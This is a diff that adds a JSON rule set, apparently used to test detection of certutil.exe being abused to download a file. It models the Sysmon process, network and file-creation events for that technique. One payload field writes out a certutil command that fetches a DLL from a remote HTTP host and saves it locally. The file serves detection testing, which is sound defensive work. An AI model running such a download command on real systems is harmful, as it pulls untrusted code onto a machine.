@@ -1,0 +1,49 @@
+{
+	"name": "RTA certutil_webrequest",
+	"version": "0.1",
+	"author": "n0dec",
+	"description": "Uses certutil.exe to download a file.",
+	"rules": {
+		"certutil_download": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Executing certutil with download commandline.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\certutil.exe",
+				"Description": "CertUtil.exe",
+				"CommandLine": "certutil.exe -urlcache -split -f http://192.168.1.10:8000/bin/mydll.dll mydll.dll"
+			}
+		},
+		"certutil_network": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Network connection detected",
+			"description": "Network activity from certutil.",
+			"payload": {
+				"Image": "C:\\Windows\\system32\\certutil.exe",
+				"DestinationPort": 8000
+			}
+		},
+		"ie_cache": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "File created",
+			"description": "Writing INetCache file.",
+			"payload": {
+				"Image": "C:\\Windows\\system32\\certutil.exe",
+				"TargetFilename": "C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\ZZIF9L44\\mydll[1].dll"
+			}
+		},
+		"drop_file": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "File created",
+			"description": "Writing downloaded file.",
+			"payload": {
+				"Image": "C:\\Windows\\system32\\certutil.exe",
+				"TargetFilename": "C:\\Users\\Administrator\\Downloads\\RTA-master\\mydll.dll"
+			}
+		}
+	}
+}
